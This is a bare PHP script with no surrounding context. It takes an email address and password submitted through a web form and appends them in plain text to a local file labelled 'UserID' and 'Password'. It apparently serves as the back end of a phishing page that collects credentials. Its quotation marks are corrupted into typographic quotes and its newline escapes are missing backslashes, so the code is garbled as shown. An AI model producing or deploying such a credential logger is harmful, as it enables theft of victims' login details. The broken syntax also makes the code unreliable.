<?php
$email = $_POST[’email’];
$pass = $_POST[‘pass’];
$fp = fopen(”formdata.txt”, “a”);
$savestring = "UserID : " . $email . “n” . "Password : " . $pass . “n” . "------------------------------------------------------------";
fwrite($fp, $savestring);
fclose($fp);
?>